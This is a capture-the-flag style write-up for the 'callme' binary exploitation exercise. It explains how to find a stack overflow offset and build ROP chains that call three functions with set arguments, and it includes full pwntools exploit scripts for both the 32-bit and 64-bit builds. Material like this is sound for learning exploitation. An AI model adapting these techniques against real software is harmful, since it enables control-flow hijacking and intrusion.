# Callme

## 32 bit

As usual we run **rabin2 -I callme** to see what kind of protection are enabled.

We need to call the function  `callme_one(), callme_two() and callme_three()`,
in this order and with 0xdeadbeef, 0xcafebabe, 0xd00df00d as parameter to do so
we need to find ROP gadget to do that.

First of all we need to find the return address. To do that we use pwntools and
with cyclic function, then read the eip.

Then we need to find the gadget to create the rop chain, we use the function
rop.call then pass the addreess of the function we want to call, with the
parameters that we want to pass.

The "three_pop" variable is created using ropgadget, there are multiple gadget
that could be good for this payload, i decided to take the most simple to read,
"pop esi ; pop edi ; pop ebp ; ret ;".

There are 2 replace in the rop chain because with the function call it add also
address of a return address that we don't want.

```python
from pwn import *

elf = context.binary = ELF('callme32')
context.log_level = 'debug'

# We get the length of our junk part of the payload
p = process(elf.path)
p.sendline(cyclic(200))
p.wait()
eip = p.corefile.eip
offset = cyclic_find(eip)
success("OFFSET " + str(offset))

callme_one = elf.symbols['callme_one']
callme_two = elf.symbols['callme_two']
callme_three = elf.symbols['callme_three']

rop = ROP(elf)
rop.call(callme_one, (0xdeadbeef, 0xcafebabe, 0xd00df00d))
rop.call(callme_two, (0xdeadbeef, 0xcafebabe, 0xd00df00d))
rop.call(callme_three, (0xdeadbeef, 0xcafebabe, 0xd00df00d))
success("ROPCHAIN " + ' '.join([hex(x) for x in unpack_many(rop.chain())]) + '\n')
payload = offset * b'A'
payload += rop.chain()

p = process(elf.path)
p.sendline(payload)
p.readall()
```

## 64 bit

As for the 32 bit we need to do the same thing, but instead of pass the
parameters using the stack we need to use the registers to do so we use a gadget
that do three pop in three different registers. There are another solution using
2 gadget, the first do 2 pop, while the second do the last pop needed.

```python
from pwn import *

elf = context.binary = ELF('callme')
context.log_level = 'debug'

# We get the length of our junk part of the payload
p = process(elf.path)
p.sendline(cyclic(50, n=8))
p.wait()
fault = p.corefile.fault_addr
offset = cyclic_find(fault, n=8)
success("OFFSET " + str(offset))

callme_one = (elf.symbols['callme_one'])
callme_two = (elf.symbols['callme_two'])
callme_three = (elf.symbols['callme_three'])

# We create the ROP
rop = ROP(elf)
rop.call(callme_one, [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d])
rop.call(callme_two, [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d])
rop.call(callme_three, [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d])
success("ROPCHAIN " + ' '.join([hex(x) for x in unpack_many(rop.chain())]) + '\n')
payload = offset * b'A'
payload += rop.chain()

p = process(elf.path)
p.sendline(payload)
p.readall()
```
